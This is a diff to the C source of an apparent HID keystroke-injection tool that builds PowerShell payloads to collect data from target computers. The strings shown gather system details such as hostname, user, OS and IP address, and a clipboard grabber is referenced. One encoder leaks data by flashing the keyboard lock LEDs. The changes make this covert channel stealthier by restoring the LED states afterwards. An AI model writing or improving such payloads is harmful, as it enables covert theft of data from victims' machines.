@@ -1,3 +1,7 @@
+/* hid_exfil_payloads.c — OS-specific keystroke payloads for HID Exfil.
+ * Generates DuckyScript-style HID sequences for data collection on
+ * Windows, macOS, and Linux targets. */
+
 #include "hid_exfil_payloads.h"
 #include <stdio.h>
 
@@ -67,12 +71,16 @@ static const char* ps_encoder_func =
     "      Start-Sleep -Milliseconds 15\r\n"
     "    }\r\n"
     "  }\r\n"
+    "  $saveCaps = [KBLed]::GetState([KBLed]::VK_CAPITAL)\r\n"
+    "  $saveNum = [KBLed]::GetState([KBLed]::VK_NUMLOCK)\r\n"
     "  for ($i = 0; $i -lt 3; $i++) {\r\n"
     "    [KBLed]::ToggleKey([KBLed]::VK_CAPITAL)\r\n"
     "    [KBLed]::ToggleKey([KBLed]::VK_NUMLOCK)\r\n"
     "    [KBLed]::ToggleKey([KBLed]::VK_SCROLL)\r\n"
     "    Start-Sleep -Milliseconds 50\r\n"
     "  }\r\n"
+    "  if ([KBLed]::GetState([KBLed]::VK_CAPITAL) -ne $saveCaps) { [KBLed]::ToggleKey([KBLed]::VK_CAPITAL) }\r\n"
+    "  if ([KBLed]::GetState([KBLed]::VK_NUMLOCK) -ne $saveNum) { [KBLed]::ToggleKey([KBLed]::VK_NUMLOCK) }\r\n"
     "}\r\n";
 
 /* ========================================================================
@@ -149,7 +157,7 @@ static const char* ps_clipboard =
 static const char* ps_sysinfo =
     "$hostname = $env:COMPUTERNAME\r\n"
     "$user = $env:USERNAME\r\n"
-    "$os = (Get-WmiObject Win32_OperatingSystem).Caption\r\n"
+    "$os = (Get-CimInstance Win32_OperatingSystem).Caption\r\n"
     "$ip = (Get-NetIPAddress -AddressFamily IPv4 | "
     "Where-Object { $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1' } | "
     "Select-Object -First 1).IPAddress\r\n"
